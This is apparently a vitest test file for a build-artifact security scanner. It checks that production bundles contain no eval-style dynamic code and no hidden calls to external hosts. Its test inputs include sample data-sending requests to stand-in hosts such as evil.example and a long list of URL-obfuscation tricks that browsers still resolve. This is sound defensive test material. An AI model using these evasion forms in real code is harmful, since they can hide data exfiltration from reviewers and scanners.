import type { ArtifactPolicy } from './artifacts.ts'
import { describe, expect, it } from 'vitest'
import { checkFileTypes, checkTestOnlyArtifacts, classifyArtifact, scanArtifacts } from './artifacts.ts'
import { ARTIFACT_POLICY } from './policy.ts'

const policy: ArtifactPolicy = {
  ...ARTIFACT_POLICY,
  allowedAddresses: [
    { address: 'http://www.w3.org/2000/svg', source: '样例', reason: 'SVG 的命名空间' },
    { address: 'http://www.w3.org/1999/xhtml', source: '样例', reason: 'XHTML 的命名空间' },
    { address: 'http://localhost', source: '样例', reason: '解析相对地址的基准' },
  ],
  globalThisProbeMax: 1,
}

function scan(content: string, path = 'assets/index.js') {
  return scanArtifacts([{ path, content }], policy)
}

function rules(content: string, path = 'assets/index.js'): string[] {
  return scan(content, path).violations.map(v => v.rule)
}

describe('US-M1-11 A01 产物扫描：动态代码', () => {
  it.each([
    ['eval(', 'eval("1+1")'],
    ['可选调用的 eval', 'eval?.(code)'],
    ['间接 eval', '(0, eval)("x")'],
    ['逗号表达式里的 eval', '(1,eval)(code)'],
    ['globalThis.eval', 'globalThis.eval(code)'],
    ['window.eval', 'window.eval(code)'],
    ['Worker 里的 self.eval', 'self.eval(code)'],
    ['用下标取 eval', 'window["eval"](code)'],
    ['new Function', 'new Function("return 1")'],
    ['new window.Function', 'new window.Function("x")'],
    ['不带 new 的 Function，参数是变量', 'var f=Function(code)();'],
    ['不带 new 的 Function，多个参数', 'Function(a,b)'],
    ['字符串 Function', 'Function("a","return a")'],
    ['经 constructor 取到 Function', '(function(){}).constructor("return 1")()'],
    ['字符串定时器', 'setTimeout("alert(1)", 10)'],
    ['字符串 setInterval', 'setInterval(\'tick()\', 10)'],
    ['window.setTimeout 的字符串参数', 'window.setTimeout("alert(1)",1)'],
    ['WebAssembly', 'WebAssembly.instantiate(bytes)'],
    ['用下标访问 WebAssembly', 'WebAssembly["instantiate"](b)'],
    ['内联 Worker（Blob）', 'new Worker(URL.createObjectURL(new Blob([atob(s)],{type:"text/javascript"})))'],
    ['内联 Worker（data URL）', 'new Worker("data:text/javascript;base64,AAAA")'],
  ])('违规：%s', (_case, code) => {
    expect(rules(code)).toContain('artifacts/dynamic-code')
  })

  it.each([
    ['先把 Function 赋给变量再 new（zod 源码里的写法）', 'let F=Function;new F(code)'],
    ['先把 Function 赋给变量再调用', 'const F=Function;F(code)()'],
    ['全局对象上的 Function 赋给变量', 'const F=globalThis.Function;F(code)()'],
    ['Reflect.construct 的参数', 'Reflect.construct(Function,[code])'],
    ['Function 的 apply', 'Function.apply(null,[code])'],
    ['eval 赋给变量', 'const e=eval;e(code)'],
    ['标签模板', 'Function`return 1`'],
    ['标识符里的转义', '\\u0065val(code)'],
  ])('违规（审查 B3）：%s', (_case, code) => {
    expect(rules(code)).toContain('artifacts/dynamic-code')
  })

  it('没有语法树的文本文件（HTML 等）仍按写法匹配 eval 与 Function', () => {
    expect(rules('<script>eval(x)</script>', 'index.html')).toContain('artifacts/dynamic-code')
    expect(rules('<svg onload="new Function(x)()"></svg>', 'assets/logo.svg')).toContain('artifacts/dynamic-code')
    expect(rules('<p>Function("return this")</p>', 'index.html')).toEqual([])
  })

  it('违规：JS 文件解析失败时不当作没有动态代码', () => {
    expect(rules('let x = ;')).toEqual(['artifacts/unparsable'])
  })

  it('合规：常见的正常写法不误报', () => {
    const code = [
      // 任何对象上名为 eval、Function 的属性都算引用（复验 R5），这里只有名字相近的
      'a.evaluate(x);b.myFunction("x");obj.eval2=1;isFunction("x");',
      'typeof f==="function";x instanceof Function;Function.prototype.call.bind(f);',
      'const tag="[object Function]";const kinds=["AsyncFunction","GeneratorFunction"];',
      'setTimeout(fn,0);self.setTimeout(()=>{},1);',
      'new Worker(new URL("./formula.worker-abc.js",import.meta.url),{type:"module"});',
      'var s="//";var t="a//b";',
    ].join('\n')
    expect(rules(code)).toEqual([])
  })

  it('合规：全局对象探测在允许的次数以内；超过即违规', () => {
    expect(rules('var g=Function("return this")();')).toEqual([])
    expect(rules('Function("return this")();Function(\'return this\')();')).toEqual(['artifacts/global-this-probe'])
  })

  it('已登记的 zod JIT 探测（空字符串的 Function）：次数以内不算动态代码，超过上限即违规；带内容的、先赋给变量的仍是动态代码', () => {
    expect(rules('var L=jo(()=>{if(zs.jitless)return!1;try{return Function(``),!0}catch{return!1}})')).toEqual([])
    expect(rules('Function(``);Function(\'\')')).toEqual(['artifacts/known-dynamic-code'])
    expect(rules('Function(`x`)')).toContain('artifacts/dynamic-code')
    expect(rules('new Function(``+code)')).toContain('artifacts/dynamic-code')
    // 登记的是压缩后的原文 Function(``)；源码里先赋给变量的写法不在登记范围里（审查 B3）
    expect(rules('const F=Function;try{new F("")}catch{}')).toContain('artifacts/dynamic-code')
  })

  // 生产产物里 zod 的 Doc.compile 原文（压缩后）；样例是产物原文，不是要插值
  // eslint-disable-next-line no-template-curly-in-string
  const zodCompiler = 'var pl=class{compile(){let e=Function,t=this?.content??[``];return new e(...Object.keys(this.closed),`return function (${this.args.join(`, `)}) {\\n${t.join(`\n`)}\\n};`)(...Object.values(this.closed))}};'

  it('已登记的 zod JIT 编译器：原文以内不算动态代码，并计数；出现两次即违规；别处把 Function 赋给变量仍然违规', () => {
    const scan = scanArtifacts([{ path: 'assets/index.js', content: zodCompiler }], policy)
    expect(scan.violations).toEqual([])
    expect(scan.knownDynamicCode).toEqual(new Map([['zod 的 JIT 探测', 0], ['zod 的 JIT 编译器', 1]]))
    expect(rules(zodCompiler + zodCompiler.replace('pl=', 'pm='))).toEqual(['artifacts/known-dynamic-code'])
    expect(rules('var pl=class{compile(){let e=Function;return e(this.code)}};')).toContain('artifacts/dynamic-code')
  })

  it('没有登记时，zod 的 JIT 编译器报为动态代码（审查 B3：P1 起漏检）', () => {
    const unregistered = { ...policy, knownDynamicCode: policy.knownDynamicCode.filter(known => known.name !== 'zod 的 JIT 编译器') }
    const { violations } = scanArtifacts([{ path: 'assets/index.js', content: zodCompiler }], unregistered)
    expect(violations.map(v => v.rule)).toEqual(['artifacts/dynamic-code'])
    expect(violations[0]?.detail).toContain('let e=Function')
  })
})

describe('US-M1-11 A01 产物扫描：外部地址与关键字', () => {
  it.each([
    ['https', 'fetch("https://evil.example.com/collect?x=1")'],
    ['大写的协议', 'fetch("HTTPS://EVIL.EXAMPLE.COM/x")'],
    ['wss', 'new WebSocket("wss://t.example.com/s")'],
    ['协议相对地址', 'fetch("//evil.example.com/collect")'],
    ['JSON 转义的斜杠', 'JSON.parse("{\\"u\\":\\"https:\\\\/\\\\/evil.example.com\\"}")'],
  ])('违规：%s', (_case, code) => {
    expect(rules(code)).toContain('artifacts/address')
  })

  it('违规：CSS 里的外部地址', () => {
    expect(rules('body{background:url(https://cdn.example.net/bg.png)}', 'assets/x.css')).toEqual(['artifacts/address'])
  })

  it('违规：解析不了的主机照样报出，原样记进主机汇总', () => {
    const result = scan('fetch("https://exa%mple.com/x")')
    expect(result.violations.map(v => v.rule)).toEqual(['artifacts/address'])
    expect([...result.hosts.keys()]).toEqual(['exa%mple.com'])
  })

  // 以下样例都是产物里的模板字符串原文，不是要插值
  /* eslint-disable no-template-curly-in-string */
  it.each([
    ['查询里的插值', 'fetch(`https://tracker.example.com/collect?u=${user}`)', 'tracker.example.com'],
    ['路径里的插值', 'img.src=`https://evil.example/${id}.gif`', 'evil.example'],
    ['WebSocket 路径里的插值', 'new WebSocket(`wss://t.example.com/s/${room}`)', 't.example.com'],
    ['主机以插值开头、后面是固定的域名', 'fetch(`https://${region}.tracker.example.com/e`)', '*.tracker.example.com'],
    ['用户信息是插值、主机固定', 'fetch(`https://${key}@o1.ingest.example.io/1`)', 'o1.ingest.example.io'],
  ])('违规（审查 B2）：主机固定、插值在后面时，按主机检查：%s', (_case, code, host) => {
    const result = scan(code)
    expect(result.violations.map(v => v.rule)).toEqual(['artifacts/address'])
    expect([...result.hosts.keys()]).toEqual([host])
  })

  it('合规：主机本身在运行时拼出（插值紧跟在 // 或 //[ 之后），看不到主机，由 CSP 兜底，单独计数', () => {
    const result = scan('function Ul(e){return Sl(`http://[${e}]`)};const u=`https://${host}/x`;const w=`wss://${host}:${port}/ws`')
    expect(result.violations).toEqual([])
    expect(result.hosts).toEqual(new Map())
    expect(result.runtimeHosts).toBe(3)
  })

  it('违规：主机或端口里有插值时，允许清单不适用（实际的地址不止这段固定部分）', () => {
    expect(rules('const a=`http://localhost${suffix}`')).toEqual(['artifacts/address'])
    expect(rules('const a=`http://localhost:${port}`')).toEqual(['artifacts/address'])
  })

  it('合规：允许清单里的地址后面拼上路径（与字符串拼接的写法一样）', () => {
    const code = 'function n(e){return`https://react.dev/errors/${e}`}function m(e){return`https://react.dev/errors/`+e}'
    expect(scanArtifacts([{ path: 'assets/index.js', content: code }], ARTIFACT_POLICY).violations).toEqual([])
  })
  /* eslint-enable no-template-curly-in-string */

  it('合规：允许清单里的地址（协议与主机不区分大小写，句末的句点不算，JSON 转义的斜杠也认得）', () => {
    expect(rules('const ns="http://www.w3.org/2000/svg";const x="HTTP://WWW.W3.ORG/1999/xhtml";const m="See http://localhost."')).toEqual([])
    expect(rules('const j="{\\"ns\\":\\"http:\\\\/\\\\/www.w3.org\\\\/2000\\\\/svg\\"}"')).toEqual([])
  })

  it.each([
    ['同一个主机上的其他地址', 'fetch("http://www.w3.org/collect?id=1")'],
    ['协议不同', 'const ns="https://www.w3.org/2000/svg"'],
    ['路径区分大小写', 'const ns="http://www.w3.org/1999/XHTML"'],
    ['登记的地址后面加上路径', 'fetch("http://localhost/api/collect")'],
    ['登记的地址加上端口', 'fetch("http://localhost:8080")'],
  ])('违规（审查 B21）：按具体地址放行，不按主机：%s', (_case, code) => {
    expect(rules(code)).toEqual(['artifacts/address'])
  })

  /* eslint-disable no-template-curly-in-string */
  it.each([
    ['协议由插值给出', 'fetch(`${location.protocol}//evil.example/collect`)', 'evil.example'],
    ['拼接出的地址（转义的斜杠）', 'fetch("https:"+"\\/\\/evil.example/c")', 'evil.example'],
    ['协议相对的本机地址', 'fetch("//localhost:3000/api")', 'localhost:3000'],
    ['协议相对的 IP 地址', 'new Image().src="//10.0.0.8/p.gif"', '10.0.0.8'],
    ['协议相对的 IPv6 地址', 'fetch("//[::1]:8080/x")', '[::1]:8080'],
    ['Unicode 转义的斜杠', 'fetch("https:\\u002F\\u002Fevil.example")', 'evil.example'],
    ['正则里的地址', 'const r=/https:\\/\\/evil\\.example/', 'evil.example'],
  ])('违规（DEF-016）：按语法树取出的值识别地址：%s', (_case, code, host) => {
    const result = scan(code)
    expect(result.violations.map(v => v.rule)).toEqual(['artifacts/address'])
    expect([...result.hosts.keys()]).toEqual([host])
  })
  /* eslint-enable no-template-curly-in-string */

  it.each([
    ['两个斜杠的注释样式的字符串', 'const c="// 说明"'],
    ['只有两个斜杠', 'const p=a+"//"+b'],
    ['源码映射的注释', 'const s="//# sourceMappingURL=x.js.map"'],
    ['路径里的两个斜杠', 'const p="a//b.example"'],
    ['注释里的协议相对写法', '/* //evil.example */ const a=1'],
  ])('合规：不是地址的写法不误报：%s', (_case, code) => {
    expect(rules(code)).toEqual([])
  })

  it('注释里的绝对地址照样报出', () => {
    expect(rules('/*! see https://evil.example/license */ const a=1')).toEqual(['artifacts/address'])
  })

  it('前缀的登记只适用于指定的文件（编辑器的产物）：以它开头的地址放行；其他文件（默认）照旧违规', () => {
    const prefixed: ArtifactPolicy = { ...policy, allowedAddresses: [{ address: 'https://support.example.com/docs/', prefix: true, source: '样例', reason: '公式帮助的链接' }] }
    const code = 'a={url:"https://support.example.com/docs/sum-function"};b="https://support.example.com/other"'
    const editor = scanArtifacts([{ path: 'assets/editor.js', content: code }], prefixed, { prefixFiles: new Set(['assets/editor.js']) })
    expect(editor.violations.map(v => v.detail.split(' ')[0])).toEqual(['https://support.example.com/other'])
    expect(editor.unusedAddresses).toEqual([])
    const platform = scanArtifacts([{ path: 'assets/index.js', content: code }], prefixed)
    expect(platform.violations).toHaveLength(2)
    expect(platform.unusedAddresses).toEqual(['https://support.example.com/docs/'])
  })

  it.each([
    ['反斜杠', 'location.href="\\\\\\\\evil.example/x"'],
    ['斜杠加反斜杠', 'location.href="/\\\\evil.example/x"'],
    ['协议之后是反斜杠', 'fetch("https:\\\\\\\\evil.example/x")'],
    ['前导空格', 'fetch(" //evil.example/x")'],
    ['斜杠中间夹制表符', 'fetch("/\t/evil.example/x")'],
    ['用户信息', 'fetch("//u@evil.example/x")'],
    ['主机里的百分号编码', 'fetch("//%65vil.example/x")'],

    ['全角字符的主机', 'fetch("//ｅｖｉｌ.example/x")'],
    ['协议之后不带斜杠', 'new WebSocket("wss:evil.example/x")'],
  ])('违规（审查 A4）：浏览器会解析成跨源地址的写法：%s', (_case, code) => {
    const result = scan(code)
    expect(result.violations.map(v => v.rule)).toEqual(['artifacts/address'])
    expect([...result.hosts.keys()]).toEqual(['evil.example'])
  })

  it('违规（审查 A4）：非 ASCII 的主机按浏览器的规则转成 ASCII（punycode）报出', () => {
    const result = scan('fetch("//évil.example/x")')
    expect(result.violations.map(v => v.rule)).toEqual(['artifacts/address'])
    expect([...result.hosts.keys()]).toEqual(['xn--vil-9la.example'])
  })

  it.each([
    ['样式的 url() 不带引号', 'a{background:url(//evil.example/a.png)}', 'assets/x.css'],
    ['样式的 @import url()', '@import url(//evil.example/a.css);', 'assets/x.css'],
    ['HTML 属性不带引号', '<img src=//evil.example/a.png>', 'index.html'],
  ])('违规（审查 A4）：%s里的协议相对地址', (_case, content, path) => {
    expect(rules(content, path)).toEqual(['artifacts/address'])
  })

  // 压缩器把普通字符串也写成模板字符串（复验 RA2）；以下样例是产物里的模板字符串原文，不是要插值
  /* eslint-disable no-template-curly-in-string */
  it.each([
    ['前导空格', 'fetch(` //evil.example/x`)'],
    ['前导空格与插值', 'fetch(` //evil.example/${a}`)'],
    ['反斜杠与插值', 'fetch(`\\\\\\\\evil.example/${a}`)'],
    ['协议之后是反斜杠', 'fetch(`https:\\\\\\\\evil.example/${a}`)'],
    ['协议之后不带斜杠', 'new WebSocket(`wss:evil.example/${a}`)'],
    ['用户信息', 'fetch(`//u@evil.example/${a}`)'],
    ['主机里的百分号编码', 'fetch(`//%65vil.example/${a}`)'],
    ['全角字符的主机', 'fetch(`//ｅｖｉｌ.example/${a}`)'],
    ['斜杠中间夹制表符', 'fetch(`/\t/evil.example/${a}`)'],
    ['插值给出协议、之后是反斜杠', 'fetch(`${p}\\\\\\\\evil.example/x`)'],
    ['插值给出协议、之后是用户信息', 'fetch(`${p}//u@evil.example/x`)'],
  ])('违规（复验 RA2）：模板字符串里浏览器会解析成跨源地址的写法：%s', (_case, code) => {
    const result = scan(code)
    expect(result.violations.map(v => v.rule)).toEqual(['artifacts/address'])
    expect([...result.hosts.keys()]).toEqual(['evil.example'])
  })

  it('合规（复验 RA2）：模板字符串里主机本身是插值的写法，单独计数', () => {
    const result = scan('fetch(` //${host}/x`);fetch(`\\\\\\\\${host}/x`)')
    expect(result.violations).toEqual([])
    expect(result.runtimeHosts).toBe(2)
  })
  /* eslint-enable no-template-curly-in-string */

  it.each([
    ['单标签的主机', 'fetch("//intranet/x")', 'intranet'],
    ['只有单标签的主机', 'fetch("//intranet")', 'intranet'],
    ['单标签的主机与默认端口', 'fetch("//nas:443/x")', 'nas'],
    ['反斜杠与单标签的主机', 'fetch("\\\\\\\\intranet/x")', 'intranet'],
    ['new URL 的协议相对写法', 'new URL("//evil",location.href)', 'evil'],
    ['协议之后是反斜杠、单标签的主机', 'fetch("https:\\\\\\\\intranet/x")', 'intranet'],
    ['协议之后不带斜杠、单标签的主机', 'new WebSocket("wss:intranet/x")', 'intranet'],
    ['https 页面上跨协议、只有一个斜杠', 'fetch("http:/evil.example/x")', 'evil.example'],
    ['十进制的 IPv4', 'fetch("//2130706433/x")', '127.0.0.1'],
  ])('违规（复验 RA3）：不像域名的主机同样会被请求：%s', (_case, code, host) => {
    const result = scan(code)
    expect(result.violations.map(v => v.rule)).toEqual(['artifacts/address'])
    expect([...result.hosts.keys()]).toEqual([host])
  })

  it.each([
    ['同协议、不带斜杠（https 页面上是相对地址）', 'fetch("https:evil.example/x")'],
    ['开头是 U+FEFF（浏览器不去掉，是相对地址）', 'fetch("\\uFEFF//evil.example/x")'],
    ['正则片段解析出的名字查不到地址', 'const r=`\\\\/*$`;const s="//(.+)"'],
  ])('合规（复验 RA3）：不是跨源地址：%s', (_case, code) => {
    expect(rules(code)).toEqual([])
  })

  it.each([
    ['url() 里转义的斜杠', 'a{background:url(\\/\\/evil.example/a.png)}'],
    ['url() 里斜杠加转义的斜杠', 'a{background:url(/\\/evil.example/a.png)}'],
    ['url() 里两个反斜杠', 'a{background:url(\\\\\\\\evil.example/a.png)}'],
    ['十六进制的转义', 'a{background:url("\\2f\\2f evil.example/a.png")}'],
    ['@import 的引号里有前导空格', '@import " //evil.example/a.css";'],
    ['image-set 的引号里有前导空格', 'a{background-image:image-set(" //evil.example/a.png" 1x)}'],
    ['https 页面上跨协议、不带斜杠', 'a{background:url(http:evil.example/a.png)}'],
    ['url() 的引号与空白', 'a{background:url( "//evil.example/a.png" )}'],
  ])('违规（复验 RA4）：样式里的写法：%s', (_case, css) => {
    const result = scan(css, 'assets/x.css')
    expect(result.violations.map(v => v.rule)).toEqual(['artifacts/address'])
    expect([...result.hosts.keys()]).toEqual(['evil.example'])
  })

  it.each([
    ['十六进制的字符引用', '<img src="&#x2f;&#x2f;evil.example/a.png">', 'index.html'],
    ['命名的字符引用', '<img src="&sol;&sol;evil.example/a.png">', 'index.html'],
    ['协议里的字符引用', '<img src="https&colon;//evil.example/a.png">', 'index.html'],
    ['反斜杠', '<img src="\\\\evil.example/a.png">', 'index.html'],
    ['引号里有前导空格', '<img src=" //evil.example/a.png">', 'index.html'],
    ['大写的属性名、等号两边有空格', '<img SRC = //evil.example/a.png>', 'index.html'],
    ['srcset 的第二个候选', '<img src="a.png" srcset="a.png 1x, //evil.example/b.png 2x">', 'index.html'],
    ['style 属性里的 url()', '<div style="background:url(&quot;//evil.example/a.png&quot;)"></div>', 'index.html'],
    ['style 元素', '<style>a{background:url(\\/\\/evil.example/a.png)}</style>', 'index.html'],
    ['meta refresh', '<meta http-equiv="refresh" content="0;url= //evil.example/x">', 'index.html'],
    ['SVG 的十进制字符引用', '<svg xmlns="http://www.w3.org/2000/svg"><image href="&#47;&#47;evil.example/a.png"/></svg>', 'assets/a.svg'],
  ])('违规（复验 RA4）：HTML 与 SVG 里的写法：%s', (_case, content, path) => {
    const result = scan(content, path)
    expect(result.violations.map(v => v.rule)).toEqual(['artifacts/address'])
    expect([...result.hosts.keys()].filter(host => host !== 'www.w3.org')).toEqual(['evil.example'])
  })

  it('合规（复验 RA4）：HTML 里本站的地址与允许清单里的命名空间；同一处不重复计数', () => {
    const result = scan('<html xmlns="http://www.w3.org/1999/xhtml"><link rel="icon" href="/favicon.ico"><script type="module" src="/assets/index.js"></script></html>', 'index.html')
    expect(result.violations).toEqual([])
    expect([...result.hosts]).toEqual([['www.w3.org', 1]])
  })

  it('违规（复验 RA4）：JSON 里的字符串按值识别', () => {
    const result = scan('{"endpoint":" //evil.example/x","ok":"/api"}', 'assets/config.json')
    expect(result.violations.map(v => v.rule)).toEqual(['artifacts/address'])
    expect([...result.hosts.keys()]).toEqual(['evil.example'])
  })

  it.each([
    ['正则片段里的两个斜杠', 'const a="//g";const b="//i"'],
    ['正则的原文字符串', 'new RegExp("\\\\d+\\\\s*")'],
    ['相对路径', 'fetch("/api/x");const c="./a//b"'],
    ['只有协议', 'const p="https:";const q="http:"'],
    ['拼接用的协议与斜杠', 'const u="https://"+host'],
  ])('合规：不是跨源地址的写法不误报：%s', (_case, code) => {
    expect(rules(code)).toEqual([])
  })

  it.each(['Sentry.init({dsn:d})', 'new PostHog()', 'o.license_key="x"', 'o.licenseKey="x"', 'import("@univerjs-pro/license")', 'https://www.googletagmanager.com/gtag/js'])('违规：关键字（不区分大小写）%s', (code) => {
    expect(rules(code)).toContain('artifacts/keyword')
  })

  it('汇总出现过的主机与允许清单里这次没出现的地址，便于审查允许清单', () => {
    const result = scan('a="http://www.w3.org/1999/xhtml";b="http://www.w3.org/2000/svg"')
    expect(result.hosts).toEqual(new Map([['www.w3.org', 2]]))
    expect(result.unusedAddresses).toEqual(['http://localhost'])
  })

  it('真实的允许清单：每一项都是合法的绝对地址，写明来源与用途，没有重复；前缀至少写到路径的第一段', () => {
    const { allowedAddresses } = ARTIFACT_POLICY
    for (const entry of allowedAddresses) {
      expect(() => new URL(entry.address), entry.address).not.toThrow()
      expect(entry.source.length > 0 && entry.reason.length > 0, entry.address).toBe(true)
      if (entry.prefix === true)
        expect(new URL(entry.address).pathname.length, entry.address).toBeGreaterThan(1)
    }
    expect(new Set(allowedAddresses.map(entry => entry.address.toLowerCase())).size).toBe(allowedAddresses.length)
  })
})

describe('US-M1-11 A01 产物的文件类型', () => {
  it('合规：已登记的类型与三个清单文件', () => {
    expect(checkFileTypes(['index.html', 'assets/index-a.js', 'assets/x.css', 'assets/f.woff2', 'assets/logo.svg', 'config.json', 'THIRD-PARTY-LICENSES.md', '.vite/manifest.json', '.vite/third-party-packages.json'])).toEqual([])
  })

  it.each(['assets/x.wasm', 'assets/app.js.map', 'assets/data.bin', 'README', 'notes.md', 'docs/THIRD-PARTY-LICENSES.md'])('违规：未登记的类型或位置 %s', (path) => {
    expect(checkFileTypes([path]).map(v => v.rule)).toEqual(['artifacts/file-type'])
  })

  it('清单文件不扫描内容，其他 .json 按文本扫描', () => {
    expect(classifyArtifact('THIRD-PARTY-LICENSES.md')).toBe('metadata')
    expect(classifyArtifact('.vite/manifest.json')).toBe('metadata')
    expect(classifyArtifact('config.json')).toBe('text')
  })
})

describe('US-M1-09 生产构建里没有测试构建的文件', () => {
  it('CSP 探针的页面与 Worker 出现在生产构建里即违规', () => {
    expect(checkTestOnlyArtifacts(['index.html', 'assets/index-abc.js']).map(v => v.subject)).toEqual([])
    expect(checkTestOnlyArtifacts(['csp-probe.html', 'assets/csp-probe-B7Lc.js', 'assets/probe-worker-CtLd.js', 'assets/index-abc.js']).map(v => v.subject))
      .toEqual(['csp-probe.html', 'assets/csp-probe-B7Lc.js', 'assets/probe-worker-CtLd.js'])
  })
})
